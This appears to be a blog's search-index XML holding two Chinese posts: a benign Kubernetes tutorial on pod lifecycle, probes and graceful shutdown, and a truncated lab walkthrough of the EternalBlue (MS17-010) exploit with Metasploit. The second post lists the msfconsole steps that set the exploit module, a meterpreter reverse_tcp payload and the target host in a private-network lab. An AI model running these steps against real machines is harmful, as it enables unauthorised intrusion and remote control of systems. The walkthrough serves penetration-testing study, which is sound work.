<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pod声明周期</title>
    <link href="/2025/05/07/pod%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F/"/>
    <url>/2025/05/07/pod%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="pod声明周期"><a href="#pod声明周期" class="headerlink" title="pod声明周期"></a>pod声明周期</h1><p>Pod 对象自从其创建开始至其终止退出的时间范围称为其生命周期。在这段时间中，Pod 会处于多种不同的状态，并执行一些操作；其中，创建主容器（main container）为必须的操作，其他可选的操作还包括进行初始化容器（init container）、容器启动后钩子（post start hook）、容器的存活性探测（liveness probe）、就绪型探测（readiness probe）以及容器终止前钩子（pre stop hook）等，这些操作是否执行则取决于 Pod 的定义。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250507170654213.png" alt="image-20250507170654213"></p><p>初始化容器</p><p>运行主容器和启动后钩子函数</p><p>启动探针（只检测一次）</p><p>存活探针和就绪探针（周期性检测）</p><p>终止前钩子函数</p><h2 id="一、Pod-phase"><a href="#一、Pod-phase" class="headerlink" title="一、Pod phase"></a>一、Pod phase</h2><p>无论是用户手动创建，还是通过 Deployment 等控制器创建，Pod 对象总是应该处于其生命进程中以下几个相位（phase）之一</p><ul><li>pending：API Server 创建了 Pod 资源对象并已存入 etcd 中，但是它尚未被调度完成，或者仍处于从仓库下载镜像的过程中。</li><li>Running：Pod 已经被调度至某节点，并且所有容器都已经被 kubelet 创建完成。</li><li>Succeeded：Pod 中的所有容器都已经成功终止并且不会被重启。</li><li>Failed：所有容器都已经终止，但至少有一个容器终止失败，即容器返回了非 0 值的退出状态或已经被系统终止。</li><li>Unkown：API Server 无法正常获取到 Pod 对象的状态信息，通常是由于其无法与所在工作节点的 kubelet 通信所致。</li></ul><p><strong>故障排查速查表</strong></p><table><thead><tr><th>现象</th><th>优先检查点</th><th>关键命令</th></tr></thead><tbody><tr><td>Pod卡在Pending</td><td>节点资源&#x2F;污点检查</td><td><code>kubectl describe node</code></td></tr><tr><td>CrashLoopBackOff</td><td>容器启动日志</td><td><code>kubectl logs --previous</code></td></tr><tr><td>服务间歇性不可用</td><td>Readiness探针配置</td><td><code>kubectl get endpoints</code></td></tr><tr><td>终止耗时过长</td><td>PreStop钩子执行情况</td><td><code>kubectl get events -w</code></td></tr><tr><td>存储卷挂载失败</td><td>PVC绑定状态</td><td><code>kubectl get pvc -o wide</code></td></tr></tbody></table><h2 id="二、pod创建流程"><a href="#二、pod创建流程" class="headerlink" title="二、pod创建流程"></a>二、pod创建流程</h2><img src="https://gitee.com/ljh00928/csdn/raw/master/img/923329-20220614164225986-684349758.png" alt="img"  /><ul><li>当执行apply命令时会加载证书文件($HOME&#x2F;.kube&#x2F;config)连接Api-server(假设是rc资源创建Pod副本数量为5);</li><li>Api-server对客户端请求进行验证，权限校验及资源清单配置文件解析;</li><li>若权限校验没问题，就会将请求记录写入到etcd数据库中进行存储;</li><li>Control Manager组件查询api-server当前集群是否有任务需要维护(发现有一个rc资源有需要创建5个副本数，目前为0，于是会watch事件，监督其副本数量升为5个);</li><li>scheduler查询api-server是否有Pod需要处于调度状态，api-server返回需要调度的列表，及集群的状态信息供给scheduler调度;</li><li>scheduler调度完成后将结果返回给api-sever，api-sever将结果存储到etcd中;</li><li>kubelet将Pod状态及worker节点资源状态周期性上报给api-server;</li><li>api-server会验证kubelet的证书文件，验证通过后将数据写入到etcd中，与此同时，会将etcd中调度到该节点的Pod任务下发给kubelet;</li><li>kubelet开始创建Pod，并周期性上报该Pod状态及节点状态给api-server;</li></ul><h2 id="三、声明周期钩子"><a href="#三、声明周期钩子" class="headerlink" title="三、声明周期钩子"></a>三、声明周期钩子</h2><p>钩子函数能够感知自身生命周期中的事件，并在相应的时刻到来时运行用户指定的程序代码</p><p>k8s 在主容器的启动之后和停止之前提供了两个钩子函数</p><ul><li>postStart：容器创建之后立刻执行，用于资源部署、环境准备等。</li><li>preStop：在容器被终止前执行，用于优雅关闭应用程序、通知其他系统等</li></ul><h4 id="钩子函数定义方式"><a href="#钩子函数定义方式" class="headerlink" title="钩子函数定义方式"></a>钩子函数定义方式</h4><p>钩子的回调函数支持两种方式定义动作，下面以 postStart 为例讲解，preStop 定义方式与其一致：</p><p><strong>exec模式</strong></p><p>在容器中执行指定的命令。如果命令退出时返回码为0，判定为执行成功。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">lifecycle:</span><br>    <span class="hljs-attr">postStart:</span><br>      <span class="hljs-attr">exec:</span><br>        <span class="hljs-attr">command:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">cat</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">/var/lib/redis.conf</span><br></code></pre></td></tr></table></figure><p><strong>HTTP GET模式</strong></p><p>对容器中的指定端点执行HTTP GET请求，如果响应的状态码大于等于200且小于400，判定为执行成功。</p><p>httpGet模式支持以下配置参数：</p><ul><li>Host：HTTP请求主机地址，不设置时默认为Pod的IP地址。</li><li>Path：HTTP请求路径，默认值是&#x2F;。</li><li>Port：HTTP请求端口号。</li><li>Scheme：协议类型，支持HTTP和HTTPS协议，默认是HTTP。</li><li>HttpHeaders：自定义HTTP请求头。</li></ul><p>示例：访问 <a href="http://192.168.2.150/users">http://192.168.2.150:80/users</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">lifecycle:</span><br>   <span class="hljs-attr">postStart:</span><br>     <span class="hljs-attr">httpGet:</span><br>       <span class="hljs-attr">path:</span> <span class="hljs-string">/users</span><br>       <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>       <span class="hljs-attr">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.150</span><br>       <span class="hljs-attr">scheme:</span> <span class="hljs-string">HTTP</span>  <span class="hljs-comment"># 或者HTTPS</span><br></code></pre></td></tr></table></figure><h2 id="四、容器探测"><a href="#四、容器探测" class="headerlink" title="四、容器探测"></a>四、容器探测</h2><p>Kubernetes 存在 3 种类型的探针，当探针检测失败时容器会被重启，如果容器在多次 (次数通过配置参数决定) 重启后仍然无法通过探针检测，容器状态将会被设置为 CrashLoopBackOff, 这意味着容器处于崩溃循环状态，无法成功启动和运行</p><h4 id="启动探针"><a href="#启动探针" class="headerlink" title="启动探针"></a><strong>启动探针</strong></h4><p><strong>Startup Probe (启动探针)</strong> 用于检测容器是否已经完成所有初始化操作。</p><p>对于starup探针是一次性检测，容器启动时进行检测，检测成功后，才会调用其他探针，且此探针不在生效。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">如果提供了启动探针，则所有其他探针都会被禁用，直到此探针成功为止。</span><br><span class="hljs-string">如果启动探测失败，kubelet将杀死容器，而容器依其重启策略进行重启。</span> <br><span class="hljs-string">如果容器没有提供启动探测，则默认状态为</span> <span class="hljs-string">Success。</span><br></code></pre></td></tr></table></figure><h4 id="存活探针"><a href="#存活探针" class="headerlink" title="存活探针"></a><strong>存活探针</strong></h4><p>&#x3D;&#x3D;【pod是否准备就绪】&#x3D;&#x3D;</p><p><strong>Liveness Probe (存活探针)</strong> 用于检测容器内部应用是否在运行，可以为单个 Pod 中的所有容器单独设置，存活探针会监控容器的健康状态，如果容器发生故障或崩溃，&#x3D;&#x3D;存活探针会判断容器不再存活，容器会被重启或替换。&#x3D;&#x3D;</p><p>一旦启动探针成功返回一次，存活探针就开始接管对容器对监控。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">健康状态检查，周期性检查服务是否存活，==检查结果失败，将&quot;重启&quot;容器(==删除源容器并重新创建新容器)。</span><br><span class="hljs-string">如果容器没有提供健康状态检查，则默认状态为Success。</span><br></code></pre></td></tr></table></figure><h4 id="就绪探针"><a href="#就绪探针" class="headerlink" title="就绪探针"></a><strong>就绪探针</strong></h4><p>&#x3D;&#x3D;【pod服务是否能被外部访问】&#x3D;&#x3D;</p><p><strong>Readiness Probe (就绪探针)</strong> 用于检测容器是否已经准备好接收流量，应用启动需要一系列初始化操作，就绪探针可以确保容器就绪前不会接收任何流量。 如果就绪检测失败，Pod 就不会再收到任何流量。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">可用性检查，周期性检查服务是否可用，从而判断容器是否就绪。</span><br><span class="hljs-string">若检测Pod服务不可用，则会将Pod从svc的ep列表中移除。</span><br><span class="hljs-string">若检测Pod服务可用，则会将Pod重新添加到svc的ep列表中。</span><br><span class="hljs-string">如果容器没有提供可用性检查，则默认状态为Success。</span><br></code></pre></td></tr></table></figure><h4 id="探针检测Pod服务方式"><a href="#探针检测Pod服务方式" class="headerlink" title="探针检测Pod服务方式"></a>探针检测Pod服务方式</h4><p><strong>主要参数</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">initialDelaySeconds</span><br><span class="hljs-string">表示容器启动后，等待多少时间之后再启动各类探针</span><br><br><span class="hljs-string">periodSeconds</span><br><span class="hljs-string">表示探针执行检测的间隔时间</span><br><br><span class="hljs-string">timeoutSeconds</span><br><span class="hljs-string">表示探针执行检测的超时后的等待时间</span><br><br><span class="hljs-string">successThreshold</span><br><span class="hljs-string">表示探针执行检测失败之后，如果容器状态想再次被标记为健康，至少需要经过多少次连续成功检测</span><br><br><span class="hljs-string">failureThreshold</span><br><span class="hljs-string">表示探针执行检测时，连续失败多少次，容器状态就会被确认不健康</span><br></code></pre></td></tr></table></figure><p><strong>HTTP GET</strong></p><p>针对容器指定 URL 执行 HTTP 请求，如果响应码 Status Code 是 2xx 或者 3xx, 将应用标记为正常运行。否则将应用标记为不健康。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">http-get-probe-example</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:latest</span><br>    <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">80</span><br>    <span class="hljs-attr">livenessProbe:</span><br>      <span class="hljs-attr">httpGet:</span><br>        <span class="hljs-attr">path:</span> <span class="hljs-string">/healthz</span>  <span class="hljs-comment"># 健康检查路径</span><br>        <span class="hljs-attr">port:</span> <span class="hljs-number">80</span>       <span class="hljs-comment"># 容器端口</span><br>        <span class="hljs-attr">scheme:</span> <span class="hljs-string">HTTP</span>   <span class="hljs-comment"># 可选 HTTP/HTTPS</span><br>      <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">5</span>  <span class="hljs-comment"># 容器启动后 5s 开始探测</span><br>      <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span>       <span class="hljs-comment"># 每 10s 探测一次</span><br>      <span class="hljs-attr">timeoutSeconds:</span> <span class="hljs-number">2</span>       <span class="hljs-comment"># 超时时间 2s</span><br>      <span class="hljs-attr">failureThreshold:</span> <span class="hljs-number">3</span>     <span class="hljs-comment"># 连续失败 3 次后重启容器</span><br>    <span class="hljs-attr">readinessProbe:</span><br>      <span class="hljs-attr">httpGet:</span><br>        <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>        <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">2</span><br>      <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p><strong>TCP</strong></p><p>针对容器指定端口号发起 TCP 连接，如果连接成功，将应用标记为正常运行。否则将应用标记为不健康。</p><p>该方法主要针对 HTTP 探针或命令探针无法运行的情况，例如 gRPC 或 FTP 等协议。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">tcp-probe-example</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">redis</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:latest</span><br>    <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">6379</span><br>    <span class="hljs-attr">livenessProbe:</span><br>      <span class="hljs-attr">tcpSocket:</span><br>        <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>  <span class="hljs-comment"># 检测 Redis 默认端口</span><br>      <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">15</span><br>      <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">20</span><br>    <span class="hljs-attr">readinessProbe:</span><br>      <span class="hljs-attr">tcpSocket:</span><br>        <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span><br>      <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">5</span><br>      <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p><strong>Exec</strong></p><p>在容器内执行任意命令 (例如文件检查、网络检查)，并检查命令的退出状态码，如果状态码为 0，将应用标记为正常运行。否则将应用标记为不健康。</p><p><strong>适用场景</strong>：</p><ul><li>检查文件是否存在（如 <code>test -f /tmp/healthy</code>）。</li><li>运行脚本检测服务状态（如 <code>curl localhost:8080</code>）。</li><li>数据库健康检查（如 <code>mysqladmin ping</code>）。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">exec-probe-example</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">myapp</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:latest</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;touch /tmp/healthy &amp;&amp; sleep 3600&quot;</span>]<br>    <span class="hljs-attr">livenessProbe:</span><br>      <span class="hljs-attr">exec:</span><br>        <span class="hljs-attr">command:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">cat</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">/tmp/healthy</span>  <span class="hljs-comment"># 如果文件存在，返回 0（健康）</span><br>      <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">5</span><br>      <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">5</span><br>    <span class="hljs-attr">readinessProbe:</span><br>      <span class="hljs-attr">exec:</span><br>        <span class="hljs-attr">command:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">sh</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">-c</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;nc -z localhost 8080 || exit 1&quot;</span>  <span class="hljs-comment"># 检查本地 8080 端口是否可连接</span><br>      <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">2</span><br>      <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><p>启动探针</p><p><strong>如果应用的启动时间过长</strong>，应该设置一个启动探针，并且&#x3D;&#x3D;将 initialDelaySeconds 参数的值设置为大于应用的启动时间，&#x3D;&#x3D;应用启动时， 不应该因为数据库等依赖项尚未就绪而崩溃，例如应该在连接失败后继续尝试重新连接，直到连接成功或者重试次数超出最大限制。</p><blockquote><p>initialDelaySeconds 参数的取值可以参考监控中的应用启动时间 P99 分位值。</p></blockquote><p>启动探针常用业务场景:</p><ul><li>数据库连接池初始化完成</li><li>缓存连接池初始化完成</li><li>热点数据缓存在本地初始化完成</li></ul><p>还有一种做法是，&#x3D;&#x3D;直接将 initialDelaySeconds 参数值设置为大于应用启动的估计时长，不使用启动探针&#x3D;&#x3D;。</p><p><strong>存活探针</strong></p><p><strong>如果应用在发生鼓掌时无法自动结束退出</strong> (例如遇到了死锁)，应该设置一个存活探针，并指定 restartPolicy 为 “Always” 或 “OnFailure”, 这样该应用会被重启。</p><p><strong>就绪探针</strong></p><p><strong>如果需要应用在完成初始化工作之后才能开始接收流量</strong>，应该设置一个就绪探针，这样可以避免流量进入到错误到 Pod 中。</p><p>就绪探针可能与存活探针相同，但是 <strong>就绪探针表示</strong> Pod 在初始化阶段不接收任何流量，并且只有就绪探针返回成功后再开始接收流量， 虽然使用启动探针也可以完成同样的功能，但是就绪探针可以区分应用位于 “正在启动中” 和 “已经完成启动，正在当前状态是正常｜失败” 两个不同的阶段中的哪一个。</p><p><strong>小结</strong></p><p><strong>就绪探针和存活探针可以同时用于同一 Pod，这样可以确保流量无法到达未准备好的 Pod，并且在探针检测失败时重启</strong>。</p><h2 id="五、容器的重启策略"><a href="#五、容器的重启策略" class="headerlink" title="五、容器的重启策略"></a>五、容器的重启策略</h2><p>容器程序发生崩溃或容器申请超过限制的资源等原因都可能会导致 Pod 对象的终止，此时是否应该重建该 Pod 对象则取决于其重启策略（restartPolicy）属性的定义。</p><ul><li><p>Always：但凡 Pod 对象终止就将其重启，此为默认设定。</p></li><li><p>OnFailure：仅在 Pod 对象出现错误时方才能将其重启。</p></li><li><p>Nerver：从不重启</p></li></ul><p> restartPolicy 适用于 Pod 对象中的所有容器，而且它仅用于控制在同一节点上重新启动 Pod 对象的相关容器。<br> 首次需要重启的容器，将在其需要时立即进行重启，随后再次需要重启的操作由 kubelet 延迟一段时间后进行，且反复的重启操作的延迟时长依次为 10秒、20秒、40秒、80秒、160秒 和 300秒，300秒是最大延迟时长。<br> Pod 一旦绑定到一个节点，Pod对象将永远不会被重新绑定到另一个点，它要么被重启，要么终止，直到节点发生故障或被删除。</p><h2 id="六、pod终止流程"><a href="#六、pod终止流程" class="headerlink" title="六、pod终止流程"></a>六、pod终止流程</h2><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250507164852268.png" alt="image-20250507164852268"></p><ul><li>用户发出删除 pod 命令：kubectl delete pods ，kubectl delete -f yaml</li><li>Pod 对象随着时间的推移更新，在宽限期（默认情况下30秒），pod 被视为“dead”状态 </li><li>pod 标记为“Terminating”状态</li><li>第三步同时运行，监控到 pod 对象为“Terminating”状态的同时启动 pod 关闭过程</li><li>第三步同时进行，endpoints 控制器监控到 pod 对象关闭，将pod与service匹配的 endpoints 列表中删除</li><li>如果 pod 中定义了 preStop 钩子处理程序，则 pod 被标记为“Terminating”状态时以同步的方式启动执行；若宽限期结束后，</li><li>preStop 仍未执行结束，第二步会重新执行并额外获得一个2秒的小宽限期</li><li>Pod 内对象的容器收到 TERM 信号</li><li>宽限期结束之后，若存在任何一个运行的进程，pod 会收到 SIGKILL 信号</li><li>Kubelet 请求 API Server 将此 Pod 资源宽限期设置为0从而完成删除操作</li></ul><h2 id="七、优雅终止"><a href="#七、优雅终止" class="headerlink" title="七、优雅终止"></a>七、优雅终止</h2><p>Pod 优雅关闭就是在容器被停止时，确保容器内的进程有足够的时间完成当前的任务，并且做必要的清理工作。这样可以避免因强制停止容器而导致的数据丢失、资源泄漏等问题。</p><p>具体来说，Kubernetes 会发送一个 SIGTERM 信号给容器，让容器进行自定义的清理工作。如果容器在指定时间内没有正常退出，Kubernetes 会发出 SIGKILL 强制终止容器。<br><strong>优雅关闭的步骤：</strong></p><ul><li>收到 SIGTERM 信号：容器收到停止信号，应该开始优雅关闭。</li><li>等待 &#x3D;&#x3D;terminationGracePeriodSeconds&#x3D;&#x3D; 时间：容器会有一段时间来进行清理工作，这个时间段可以自定义。</li><li>执行 preStop 钩子：如果配置了 preStop 钩子，它会在 SIGTERM 信号发送后立刻执行。</li><li>完成清理并退出：容器完成清理工作后退出。</li><li>超时后发送 SIGKILL：如果容器在规定时间内没有正常退出，Kubernetes 会强制终止它。</li></ul><p><strong>如何配置 Pod 的优雅关闭？</strong></p><p>关键点：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">terminationGracePeriodSeconds：控制容器关闭时的最大等待时间。</span><br><span class="hljs-string">preStop钩子：容器关闭前执行的命令，帮助我们在容器退出前完成清理工作。</span><br></code></pre></td></tr></table></figure><p> 1.配置 <code>terminationGracePeriodSeconds</code></p><p>控制容器关闭时的最大等待时间。</p><p>这是控制 Pod 在关闭时等待的时间。默认情况下是 30 秒，即容器会在收到 SIGTERM 信号后有 30 秒的时间来优雅退出。你可以通过 terminationGracePeriodSeconds 来修改这个时间。</p><p>示例：设置优雅关闭时间为 60 秒</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">mypod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">terminationGracePeriodSeconds:</span> <span class="hljs-number">60</span>  <span class="hljs-comment"># 设置优雅关闭时间为 60 秒</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">my-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">my-image</span><br></code></pre></td></tr></table></figure><ol start="2"><li>使用 <code>preStop</code> 钩子</li></ol><p>preStop 钩子是一个非常有用的特性，它允许你在容器关闭前执行自定义的脚本或命令，帮助你完成一些清理工作。比如，可以在容器关闭前断开数据库连接、保存临时文件等。</p><p>示例：配置 preStop 钩子</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">mypod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">terminationGracePeriodSeconds:</span> <span class="hljs-number">60</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">my-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">my-image</span><br>      <span class="hljs-attr">lifecycle:</span><br>        <span class="hljs-attr">preStop:</span><br>          <span class="hljs-attr">exec:</span><br>            <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;echo &#x27;Stopping container...&#x27;; sleep 10&quot;</span>]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>云原生</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf渗透测试之永恒之蓝</title>
    <link href="/2025/04/18/msf%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <url>/2025/04/18/msf%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p><strong>前提：对方的445端口必须开放,首先要保证是能够访问到目标机器的，那么我们先ping一下目标机器，看网络是否连通</strong></p><p><strong>如果无法ping的话，对方机器必须要关闭防火墙，或许有其他方法在对方开启防火墙的情况下访问到对方？目前采用关闭防火墙</strong></p><p><strong>使用工具：kali</strong></p><p>靶机：windows 7  ip：10.0.0.128</p><p>攻击机器：kali IP：10.0.0.139</p><p>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#登录MSF</span><br>┌──(root㉿kali)-[/home/cherry]<br>└─# msfconsole  <br>       =[ metasploit v6.4.54-dev                          ]  框架的版本号是 v6.4.54-dev<br>+ -- --=[ 2499 exploits - 1289 auxiliary - 393 post       ]  2499 个漏洞利用模块。1289个辅助模块。393个后渗透模块<br>+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]  1607 个有效载荷  49个编码器 13个NOP 生成器<br>+ -- --=[ 9 evasion    9 个规避模<br></code></pre></td></tr></table></figure><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="1-基础使用"><a href="#1-基础使用" class="headerlink" title="1.基础使用"></a>1.基础使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apl">msfconsole    #进入框架<br>search  ms17_010                                    # 使用search命令查找相关漏洞<br>use exploit/windows/smb/ms17_010_eternalblue        # 使用use进入模块<br>info         #使用info查看模块信息<br>set payload windows/x64/meterpreter/reverse_tcp    #设置攻击载荷<br>show options    #查看模块需要配置的参数<br>set  RHOST 10.0.0.128            #设置参数<br>exploit / run         #攻击<br>后渗透阶段 